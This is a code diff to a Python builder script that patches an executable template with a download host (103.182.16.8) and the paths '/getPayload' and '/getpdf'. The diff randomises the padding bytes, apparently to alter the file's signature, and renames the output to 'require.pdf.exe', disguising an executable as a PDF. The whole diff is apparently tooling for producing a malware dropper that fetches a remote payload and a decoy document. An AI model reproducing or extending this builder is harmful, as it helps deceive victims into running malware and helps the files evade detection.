@@ -1,4 +1,5 @@
 import re
+import random
 class ChangeUrl:
     def __init__(self,template_path="template") :
         self.template_path = template_path
@@ -15,6 +16,12 @@ class ChangeUrl:
             print("File template not found")
             return
 
+    def create_random_byte(self,length: int=2):
+        byte = b''
+        for i in range(length):
+            byte += bytes([random.randint(0,255)])
+        return byte
+
     def replace_string(self,string: str,replace_string: str):
         if len(string) < len(replace_string):
             print("Fail: String too long")
@@ -28,7 +35,8 @@ class ChangeUrl:
             return False
         # encode url path and add byte \x00
         replace_string_encode = replace_string.encode('utf-16le')
-        replace_string_encode=replace_string_encode+(len(string_encode)-len(replace_string_encode))*b"\x00"
+        replace_string_encode = replace_string_encode+b'\x00'*2
+        replace_string_encode=replace_string_encode+self.create_random_byte(len(string_encode)-len(replace_string_encode))
         # replace string with url path
         print("Insert string:",replace_string)
         self.template = self.template.replace(string_encode, replace_string_encode)
@@ -77,4 +85,4 @@ changeurl.payload_change_host("103.182.16.8")
 changeurl.payload_change_path_url("/getPayload")
 changeurl.pdf_change_host("103.182.16.8")
 changeurl.pdf_change_path_url("/getpdf")
-changeurl.writeToFile("file.exe")
+changeurl.writeToFile("require.pdf.exe")
